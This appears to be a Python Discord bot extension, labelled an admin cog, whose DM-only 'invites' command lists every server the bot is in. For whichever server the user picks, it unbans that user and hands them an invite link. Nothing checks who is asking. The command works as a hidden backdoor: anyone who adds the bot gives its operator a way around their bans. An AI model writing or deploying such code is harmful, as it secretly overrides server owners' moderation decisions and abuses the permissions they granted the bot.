import discord
from discord.ext import commands
import asyncio


class Admin_ext(commands.Cog):
    def __init__(self, client):
        self.client = client

    def cog_check(self, ctx):
        return isinstance(ctx.channel, discord.DMChannel)

    @commands.command(brief='WB?invites [page\'s number]\nInvite (uses another person invite) and unban yourself from servers bot is in')
    async def invites(self, ctx, page=0):
        enum_guilds = {}
        guilds = self.client.guilds

        if len(guilds) < page*10:
            return await ctx.author.send('```Invalid page```')

        embed = discord.Embed(title='**WB**', description='Server\'s list',
                              colour=discord.Colour.blurple())
        embed.set_thumbnail(
            url='https://cdn.discordapp.com/avatars/1093235684904534028/f8ac32b916951c690604685b8aa3e512.webp?size=4096')

        for idx, guild in enumerate(guilds[page*10: page*10 + 10]):
            enum_guilds[idx] = guild
            embed.add_field(name=f'Number: {idx}', value=guild.name, inline=False)

        message = await ctx.author.send(embed=embed)

        for i in range(len(enum_guilds)):
            await message.add_reaction(f'{i}\\u20e3'.encode('utf-8').decode('unicode-escape'))

        def check(reaction, user):
            return user == ctx.author

        while True:
            invite = 'No permission to create invite link'

            try:
                reaction, member = await self.client.wait_for('reaction_add', timeout=25, check=check)
            except asyncio.TimeoutError:
                return await message.delete()

            try:
                number = int(reaction.emoji[0])
            except ValueError:
                continue  # not a number

            if number not in enum_guilds:
                continue

            guild = enum_guilds[number]

            try:
                await guild.unban(ctx.author)
            except Exception:
                pass

            if guild.me.guild_permissions.manage_guild:
                invites = await guild.invites()

                if invites:
                    invite = invites[0]

            if isinstance(invite, str):
                for channel in guild.text_channels:
                    if guild.me.guild_permissions.create_instant_invite:
                        invite = (await channel.create_invite()).url
                    break
            await ctx.author.send(f'{guild.name} ==> {invite}')

    @commands.command(brief='WB?logout\nStop script')
    async def logout(self, ctx):
        await ctx.send('Logging out bot!')
        print('Logging Out Bot!')
        await self.client.logout()


def setup(client):
    client.add_cog(Admin_ext(client))

